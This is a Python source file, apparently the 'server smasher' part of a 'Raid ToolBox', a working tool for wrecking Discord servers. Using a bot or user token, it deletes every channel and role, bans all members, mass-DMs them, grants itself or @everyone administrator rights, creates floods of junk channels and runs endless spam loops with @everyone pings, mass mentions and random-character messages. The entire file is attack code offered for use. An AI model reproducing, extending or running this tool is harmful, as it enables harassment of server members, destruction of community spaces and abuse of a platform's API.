try:
    import os
    import sys
    import json
    import time
    import random
    import asyncio
    import discord
    import requests
    import pyperclip
    from smconfig import *
    from colorama import init
    from termcolor import colored
    from discord import Permissions
    from threading import Thread
    from queue import Queue
    from concurrent.futures import ThreadPoolExecutor
except Exception as e:
    print ("Module import error: " + str(e))
    input()
    sys.exit()

class Worker(Thread):
    """
    Pooling
    """

    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as ex:
                pass
            finally:
                self.tasks.task_done()

class ThreadPool:
    """
    Pooling
    """

    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads):
            Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        """
        Add a task to be completed by the thread pool
        """
        self.tasks.put((func, args, kargs))

    def map(self, func, args_list):
        """
        Map an array to the thread pool
        """
        for args in args_list:
            self.add_task(func, args)

    def wait_completion(self):
        """
        Await completions
        """
        self.tasks.join()

pool = ThreadPool(int(threadcount))
loop = asyncio.get_event_loop()
channellist = []
client = discord.Client()

if sys.platform.startswith('win32'):
    clear = lambda: os.system('cls')
elif sys.platform.startswith('linux'):
    clear = lambda: os.system('clear')
init()


#Attacks
def deletechannel(channel):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/channels/"+channel, headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        deletechannel(channel)

def deleterole(role,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.delete("https://discordapp.com/api/v6/guilds/"+str(server)+"/roles/"+str(role), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(3)
        deleterole(role,server)

def senddmtouser(user,content):
    dmlist = []
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}

    payload = {
        'recipient_id': user
    }
    src = requests.post('https://discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    userdm = src.content.decode()
    jsonstring = json.loads(userdm).values()
    for x in jsonstring:
        dmlist.append(x) #boat floating
    userdm = dmlist[2]
    payload = {"content" : content,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+userdm+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        senddmtouser(user,content)

def banuser(user,server):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    src = requests.put("https://discordapp.com/api/v6/guilds/"+str(server)+"/bans/"+str(user)+"?delete-message-days=1&reason="+str(banreason), headers=headers)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        banuser(user,server)

def createchannel(server,channelname,channeltype):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {'name': channelname,'type': channeltype}
    src = requests.post("https://discordapp.com/api/v6/guilds/"+str(server)+"/channels", headers=headers,json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        createchannel(channelname)

def sendspam(channel,msgcontent,usetts):
    if clienttype == 'bot':
        headers={ 'Authorization': 'Bot '+token}
    else:
        headers={ 'Authorization': token}
    payload = {"content" : msgcontent,"tts" : usetts,"mention_everyone" : "true"}
    src = requests.post("https://discordapp.com/api/v6/channels/"+channel+"/messages", headers=headers, json=payload)
    if "You are being rate limited." in str(src.content):
        time.sleep(1)
        sendspam(channel,msgcontent,usetts)

print ("Starting...")

def inputselection(text):
    output = input(text)
    return output

def complete_pool():
    pool.wait_completion()
    return None

@client.event
async def on_ready():
    if changegameonlogin == True:
        await client.change_presence(activity=discord.Game(name=logingame))
    clear()
    print (colored("Login success!","green"))
    await serverselect()

async def serverselect():
    lists = []
    clear()
    if clienttype == "bot":
        usert = "Bot"
    else:
        usert = "User"
    print("Logged in as {}".format(client.user.name+"#"+client.user.discriminator))
    print("{} is in the following channels: \n".format(usert))
    counter = -1
    for serv in client.guilds:
        membcount = 0
        for member in serv.members:
            membcount += 1
        counter += 1
        print(colored(str(counter)+'. ('+str(serv.id)+') '+str(serv)+" ({} members)".format(membcount)+'\n',"green"))
        lists.append(serv.id)
    print('----------------------------------------')
    servernum = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Select the server to configure bot actions: ')
    if servernum.lower() == 'back':
        print ("Returning to Raid ToolBox.")
        await client.close()
        await asyncio.sleep(2)
    elif servernum.lower() == 'b':
        print ("Returning to Raid ToolBox.")
        await client.close()
        await asyncio.sleep(2)
    else:
        try:
            SERVER = lists[int(servernum)]
        except:
            await serverselect()
    await main(SERVER)

async def main(SERVER):
    #options
    clear()
    server = client.get_guild(int(SERVER))
    print ("Server: " + server.name)
    print ("Server ID: " + str(SERVER))
    print ("----------------------------------------")
    print ("Options:")
    print (colored(" 0. Return to server select. \n 1. Configure then destroy. \n 2. Create Server Invite. \n 3. Change What the bot is playing. \n 4. Leave server. \n 5. Return to Raid ToolBox Menu","green"))
    opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
    toggleopts = {
        'namechange' : namechange,
        'servname' : servname,
        'iconbegone' : iconbegone,
        'changeicon' : changeicon,
        'iconfile' : iconfile,
        'chandel' : chandel,
        'roledel' : roledel,
        'userban' : userban,
        'banreason' : banreason,
        'userid' : userid,
        'senddm' : senddm,
        'dmcontent' : dmcontent,
        'createchan' : createchan,
        'chanmethod' : chanmethod,
        'channame' : channame,
        'channelno' : channelno,
        'usespam' : usespam,
        'spammethod' : spammethod,
        'usetts' : usetts,
        'customtxt' : customtxt,
        'gimmieadmin' : gimmieadmin,
        'me' : me,
        'giveeveryoneadmin' : giveeveryoneadmin
        }
    try:
        if int(opts) == 0:
               await serverselect()

        elif int(opts) == 1:
            async def changesettings(toggleopts,SERVER):
                try:
                    clear()
                    server = client.get_guild(int(SERVER))
                    print (colored("Type 'start' to start.","green"))
                    print (colored("0.  Go back","green"))
                    print (colored("1.  Change server name: {}".format(toggleopts['namechange']),"green"))
                    print (colored("2.  New Server Name: {}".format(toggleopts['servname']),"green"))
                    print (colored("3.  Remove server icon: {}".format(toggleopts['iconbegone']),"green"))
                    print (colored("4.  Change server icon: {}".format(toggleopts['changeicon']),"green"))
                    print (colored("5.  Icon Filename: {}".format(toggleopts['iconfile']),"green"))
                    print (colored("6.  Delete all channels: {}".format(toggleopts['chandel']),"green"))
                    print (colored("7.  Delete all roles: {}".format(toggleopts['roledel']),"green"))
                    print (colored("8.  Ban all members: {}".format(toggleopts['userban']),"green"))
                    print (colored("9.  Ban Reason: {}".format(toggleopts['banreason']),"green"))
                    print (colored("10. Users to not Ban: {}".format(toggleopts['userid']),"green"))
                    print (colored("11. Send DM to everyone: {}".format(toggleopts['senddm']),"green"))
                    print (colored("12. DM Content: {}".format(toggleopts['dmcontent']),"green"))
                    print (colored("13. Create Channels: {}".format(toggleopts['createchan']),"green"))
                    print (colored("14. Channel Creation type: {}".format(toggleopts['chanmethod']),"green"))
                    print (colored("15. Name for the created channels: {}".format(toggleopts['channame']),"green"))
                    print (colored("16. Number of channels to create: {}".format(toggleopts['channelno']),"green"))
                    print (colored("17. Spam after destruction: {}".format(toggleopts['usespam']),"green"))
                    print (colored("18. Spamming method: {}".format(toggleopts['spammethod']),"green"))
                    print (colored("19. Text to spam: {}".format(toggleopts['customtxt']),"green"))
                    print (colored("20. Use text to speech in message: {}".format(toggleopts['usetts']),"green"))
                    print (colored("21. Give yourself admin: {}".format(toggleopts['gimmieadmin']),"green"))
                    print (colored("22. Your ID: {}".format(toggleopts['me']),"green"))
                    print (colored("23. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),"green"))
                    toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
                    if toga.lower() == "start":
                        for channel in server.channels:
                            myperms = channel.permissions_for(server.get_member(client.user.id))
                            if myperms.administrator:
                                pass
                            else:
                                print (colored("You do not have the permissions to destroy this server.","red"))
                                con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
                                if con.lower() == 'y':
                                    pass
                                else:
                                    await main(SERVER)
                        if toggleopts['chandel'] == True:
                            print('Deleting channels.')
                            for channel in server.channels:
                                print (colored("Deleting " + str(channel.name),"blue"))
                                pool.add_task(deletechannel,channel.id)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
                            print('Finished deleting channels.')

                        if toggleopts['roledel'] == True:
                           print ('Deleting Roles.')
                           for role in server.roles:
                                print (colored("Deleting role: " + role.name,"blue"))
                                pool.add_task(deleterole,role.id,SERVER)
                           pool.wait_completion()
                           print('Finished deleting roles.')

                        if toggleopts['senddm'] == True:
                            for user in server.members:
                                print (colored('Sending DM to ' + user.name,"blue"))
                                pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'])
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['namechange'] == True:
                            print('Changing server name...')
                            await server.edit(name=str(toggleopts['servname']))

                        if toggleopts['iconbegone'] == True:
                            print('Removing icon...')
                            await client.edit_server(server=server, icon=None)

                        if toggleopts['changeicon'] == True:
                            print('Changing icon...')
                            if sys.platform.startswith('win32'):
                                icofile = ".\\spammer\\serversmasher\\" + toggleopts['iconfile']
                            elif sys.platform.startswith('linux'):
                                icofile = "spammer/serversmasher/" + toggleopts['iconfile']
                            with open(icofile, 'rb') as handle:
                                icon = handle.read()
                                await client.edit_server(server, icon=icon)

                        if toggleopts['giveeveryoneadmin'] == True:
                            print('Giving everyone admin...')
                            for role in server.roles:
                                if role.name == '@everyone':
                                    await client.edit_role(server=server, role=role,permissions=Permissions.all())
                                    break

                        if toggleopts['userban'] == True:
                            print('Banning users...')
                            for user in server.members:
                                if toggleopts['userid'] in user.name:
                                    print (colored("Not Banning " + str(user.name),"green"))
                                else:
                                    print (colored('Banning ' + str(user.name),"blue"))
                                    pool.add_task(banuser,user.id,SERVER)
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                        if toggleopts['gimmieadmin'] == True:
                            print('Giving you admin...')
                            role = await client.create_role(server, name="Admin", permissions=Permissions.all())
                            user = server.get_member(toggleopts['me'])
                            await client.add_roles(user, role)

                        if toggleopts['createchan'] == True:
                            print('Creating channels.')
                            for x in range(int(toggleopts['channelno'])):
                                if toggleopts['chanmethod'].lower() == "ascii":
                                    asc = ""
                                    for x in range(60):
                                        num = random.randrange(13000)
                                        asc = asc + chr(num)
                                    pool.add_task(createchannel,SERVER,asc,"text")
                                if toggleopts['chanmethod'].lower() == "set":
                                    pool.add_task(createchannel,SERVER,toggleopts['channame'],"text")

                                if toggleopts['chanmethod'].lower() == "voice":
                                    pool.add_task(createchannel,SERVER,toggleopts['channame'],"voice")
                            await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

                            print ('Channels Created.')

                        if toggleopts['chanmethod'].lower() == "voice":
                            if toggleopts['chandel'] == True:
                                print (colored("Not spamming, due to there only being voice channels in this server.","red"))
                                input ()
                                await main(SERVER)

                        if toggleopts['usespam'] == True:
                            print('Spam will start in 5 seconds.')
                            if toggleopts['spammethod'] == "asc":
                                await ascii_spam(SERVER,toggleopts['usetts'])
                            if toggleopts['spammethod'] == "massment":
                                await mass_tag(SERVER,toggleopts['usetts'])
                            if toggleopts['spammethod'] == "text":
                                await text_spam(SERVER,toggleopts['customtxt'],toggleopts['usetts'])
                            if toggleopts['spammethod'] == "everyone":
                                await everyonespam(SERVER,toggleopts['usetts'])
                        else:
                            print ("Finished!")
                            input()
                            await main(SERVER)
                    if int(toga) == 0:
                        await main(SERVER)
                    elif int(toga) == 1:
                        if toggleopts['namechange'] == True:
                            toggleopts['namechange'] = False
                        else:
                            toggleopts['namechange'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 2:
                        toggleopts['servname'] = input ("New Server name: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 3:
                        if toggleopts['iconbegone'] == True:
                            toggleopts['iconbegone'] = False
                        else:
                            toggleopts['iconbegone'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 4:
                        if toggleopts['changeicon'] == True:
                            toggleopts['changeicon'] = False
                        else:
                            toggleopts['changeicon'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 5:
                        toggleopts['iconfile'] = input ("Name of the icon: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 6:
                        if toggleopts['chandel'] == True:
                            toggleopts['chandel'] = False
                        else:
                            toggleopts['chandel'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 7:
                        if toggleopts['roledel'] == True:
                            toggleopts['roledel'] = False
                        else:
                            toggleopts['roledel'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 8:
                        if toggleopts['userban'] == True:
                            toggleopts['userban'] = False
                        else:
                            toggleopts['userban'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 9:
                        toggleopts['banreason'] = input ("Ban Reason: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 10:
                        appen = input ("Username and Descriminator: ")
                        toggleopts['userid'].append(appen)
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 11:
                        if toggleopts['senddm'] == True:
                            toggleopts['senddm'] = False
                        else:
                            toggleopts['senddm'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 12:
                        toggleopts['dmcontent']  = input ("DM Content: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 13:
                        if toggleopts['createchan'] == True:
                            toggleopts['createchan'] = False
                        else:
                            toggleopts['createchan'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 14:
                        toggleopts['chanmethod']  = input ("Channel Creation method (set,ascii,voice): ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 15:
                        toggleopts['channame']  = input ("Name of created channels: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 16:
                        toggleopts['channelno'] = input ("Number of Channels to create: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 17:
                        if toggleopts['usespam'] == True:
                            toggleopts['usespam'] = False
                        else:
                            toggleopts['usespam'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 18:
                        toggleopts['spammethod']  = input ("Spamming method (text,asc,everyone): ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 19:
                        toggleopts['customtxt']  = input ("Text to spam: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 20:
                        if toggleopts['usetts'] == 'true':
                            toggleopts['usetts'] = 'false'
                        else:
                            toggleopts['usetts'] = 'true'
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 21:
                        if toggleopts['gimmieadmin'] == True:
                            toggleopts['gimmieadmin'] = False
                        else:
                            toggleopts['gimmieadmin'] = True
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 22:
                        toggleopts['me']  = input ("Your ID for giving admin: ")
                        await changesettings(toggleopts,SERVER)
                    elif int(toga) == 23:
                        if toggleopts['giveeveryoneadmin'] == True:
                            toggleopts['giveeveryoneadmin'] = False
                        else:
                            toggleopts['giveeveryoneadmin'] = True
                        await changesettings(toggleopts,SERVER)
                except Exception as e:
                    print (e)
                    input()
            await changesettings(toggleopts,SERVER)

        elif int(opts) == 2:
            for channel in server.channels:
                if channel.type == discord.ChannelType.text:
                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                    invite = invitelinknew.url
                    pyperclip.copy(invite)
                    print (invite + " copied to clipboard.")
                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                    await main(SERVER)

                elif channel.type == discord.ChannelType.voice:
                    invitelinknew = await client.create_invite(destination=channel, xkcd=True, max_uses=100)
                    invite = invitelinknew.url
                    pyperclip.copy(invite)
                    print (invite + " copied to clipboard.")
                    await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
                    await main(SERVER)

        elif int(opts) == 3:
            play = input ("Playing ")
            await client.change_presence(game=discord.Game(name=play))
            await main(SERVER)

        elif int(opts) == 4:
            print ("Are you sure you want to leave this server? (Y/N): ")
            yn = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
            if yn.lower() == 'y':
                await client.leave_server(server)
                await asyncio.sleep(3)
                await serverselect()
            else:
                await main(SERVER)

        elif int(opts) == 5:
            print ("Returning to Raid ToolBox.")
            await client.close()

    except Exception as e:
        print (colored("Error:","red"))
        print (colored(e,"red"))
        await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
        await main(SERVER)

async def mass_tag(SERVER,usetts):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    msg = ' '
    for m in server.members:
        msg += m.mention + ' '
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Mass Mentioning in: '+c.name)
            for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                pool.add_task(sendspam,c.id,m,usetts)
       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

async def ascii_spam(SERVER,usetts):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Ascii Spamming in: '+c.name)
            asc = ""
            for x in range(1999):
                num = random.randrange(13000)
                asc = asc + chr(num)
            pool.add_task(sendspam,c.id,asc,usetts)
       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

async def text_spam(SERVER,customtxt,usetts):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            print('Text Spamming in: '+c.name)
            pool.add_task(sendspam,c.id,customtxt,usetts)
       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

async def everyonespam(SERVER,usetts):
    server = client.get_server(SERVER)
    await asyncio.sleep(5)
    await client.wait_until_ready()
    while not client.is_closed:
       for c in server.channels:
            if c.type != discord.ChannelType.text:
               continue
            myperms = c.permissions_for(server.get_member(client.user.id))
            if not myperms.send_messages:
                continue
            message = "@everyone"
            print('@everyone Spamming in: '+c.name)
            pool.add_task(sendspam,c.id,message,usetts)
       #await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)

if clienttype.lower() == "user":
    try:
        client.run(token, bot=False)
    except Exception as c:
        print (str(c))
if clienttype.lower() == "bot":
    try:
        client.run(token)
    except Exception as c:
        print (str(c))
        input()
